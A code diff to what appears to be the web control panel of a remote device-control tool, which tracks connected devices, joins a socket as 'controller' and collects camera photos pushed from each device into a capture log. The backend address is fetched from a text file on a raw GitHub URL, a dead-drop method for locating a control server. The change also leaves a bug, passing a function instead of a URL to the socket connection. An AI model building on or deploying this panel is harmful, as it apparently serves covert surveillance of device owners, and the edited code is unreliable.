@@ -1663,7 +1663,7 @@ body::after {
       </div>
       <div class="stat-info">
         <div class="stat-val" style="font-size:13px">
-          <span id="acct-online-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> on </span><span id="acct-offline-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> Offline/span>
+          <span id="acct-online-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> on </span><span id="acct-offline-badge" style="color:#fbbf24">0</span><span style="color:var(--t3);font-size:9px;font-weight:400"> off</span>
         </div>
         <div class="stat-lbl">TOTAL DEVICE</div>
       </div>
@@ -1720,6 +1720,7 @@ body::after {
     </div>
   </div>
 
+  <div class="footer">XYZ PROJECT · SECURE DASHBOARD</div>
 </div>
 
 <!-- ══════════════════════════════════ CONTROL SCREEN ══════════════════════════════════ -->
@@ -2268,23 +2269,19 @@ body::after {
 <script>
 
 const API_TXT_URL = "https://raw.githubusercontent.com/ZalRyuichi/Store/main/ryuichi_api.txt";
-// Baca cache dulu sinkron — socket bisa langsung init tanpa nunggu fetch
-let API_BASE = (localStorage.getItem("app_api_base") || "").trim();
+let API_BASE = "";
 
-// Update di background — refresh cache tapi tidak block apapun
-async function refreshApiBase() {
+async function loadApiBase() {
   try {
+    const cached = localStorage.getItem("app_api_base");
+    if (cached) API_BASE = cached.trim();
     const r = await fetch(API_TXT_URL + "?t=" + Date.now());
     if (r.ok) {
       const u = (await r.text()).trim();
-      if (u && u.startsWith("http")) {
-        localStorage.setItem("app_api_base", u);
-        API_BASE = u;
-      }
+      if (u && u.startsWith("http")) { API_BASE = u; localStorage.setItem("app_api_base", u); }
     }
-  } catch {}
+  } catch { const c = localStorage.getItem("app_api_base"); if (c) API_BASE = c.trim(); }
 }
-refreshApiBase(); // jalankan background, tidak di-await
 
 function apiUrl(p) { return API_BASE ? `${API_BASE}${p}` : p; }
 
@@ -2314,10 +2311,8 @@ setInterval(() => {
   }
 }, 30000)
 
-// Init socket langsung — API_BASE sudah ada dari cache localStorage
-const socket = io(API_BASE || undefined, { transports: ['websocket', 'polling'] })
-
-window.addEventListener('DOMContentLoaded', () => {
+window.addEventListener('DOMContentLoaded', async () => {
+  await loadApiBase();
   const uEl = document.getElementById('acct-username')
   const rEl = document.getElementById('acct-role')
   const hmU = document.getElementById('hmenu-username')
@@ -2434,10 +2429,9 @@ function backToSelect() {
   updateProtectionUI(false)
 }
 
+const socket = io(apiUrl || undefined)
 
-
-
-  socket.on('connect', () => {
+socket.on('connect', () => {
   socket.emit('controller:join', { token: _token })
   fetch(apiUrl('/api/devices'), { headers: { 'Authorization': 'Bearer ' + _token } }).then(r => r.json()).then(devices => {
     allDevices = devices
@@ -6430,7 +6424,6 @@ socket.on('device:photo', ({ deviceId, facing, image }) => {
   const grid = document.getElementById('capture-log-grid-' + deviceId)
   if (grid) prependCaptureThumb(grid, entry, deviceId)
 })
-
 
 function openCaptureLog(deviceId) {
   const store = _captureStore[deviceId] || { photos: [] }
